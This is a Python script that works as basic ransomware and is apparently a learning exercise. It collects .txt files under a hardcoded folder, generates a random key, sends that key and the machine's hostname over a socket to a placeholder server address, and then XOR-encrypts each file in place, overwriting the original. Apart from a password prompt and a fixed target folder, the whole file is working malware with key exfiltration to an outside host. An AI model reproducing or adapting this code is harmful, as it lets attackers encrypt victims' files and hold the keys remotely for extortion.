import os
import random
import socket


safeguard = input("Please enter the safeguard password: ")
if safeguard != "start":
    quit()


# # Encryption function that threads will run
def encrypt(file_to_encrypt, key):
    try:
        key_index = 0
        max_key_index = len(key) - 1
        encrypted_data = ''
        with open(file_to_encrypt, 'rb') as f:
            data = f.read()
        with open(file_to_encrypt, 'w') as f:
            f.write('')
        for byte in data:
            xor_byte = byte ^ ord(key[key_index])
            with open(file_to_encrypt, 'ab') as f:
                f.write(xor_byte.to_bytes(1, 'little'))
            # increment key index
            if key_index >= max_key_index:
                key_index = 0
            else:
                key_index += 1
        print(f'{file_to_encrypt} successfully incrypted')
    except Exception as e:
        print("Exception is " + str(e))



# socket information
IP_ADDRESS = 'myIpAddress'
PORT = 5678

#Encryption information
ENCRYPTION_LEVEL = 512 // 8      #512 bit encryption = 64 bytes
key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./;[]{}\|'
key_char_pool_len = len(key_char_pool)

# Grab filepaths to encrypt
print("Preparing files...")


abs_files = []
for root, dirs, files in os.walk("C:\\Igor_secrets"):
    for file in files:
        file_path, file_ext = os.path.splitext(root + "\\" + file)
        print("File path " + file_path + "File extension: " + file_ext)
        if file_ext == ".txt":
            abs_files.append(file_path+file_ext)
print("successfully allocated all the files!")

#
# # Grab clients hostname
hostname = os.getenv("COMPUTERNAME")

# Generate encryption key
print("Generate encryption key...")
key = ''
for i in range(ENCRYPTION_LEVEL):
    key += key_char_pool[random.randint(0, key_char_pool_len-1)]
print("Key Generated!!!")
#
# #Connect to server to transfer key and hostname
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP_ADDRESS, PORT))
    print("Successfully connected... transmitting hostname and key")
    s.send(f'f{hostname}: {key}'.encode('utf-8'))
    print('Finished transmitting data!')
    s.close()

print("Amount of files to encrypt" + str(len(abs_files)))
for file in abs_files:
    encrypt(file, key)

print("Encryption and upload are completed!!! :)")
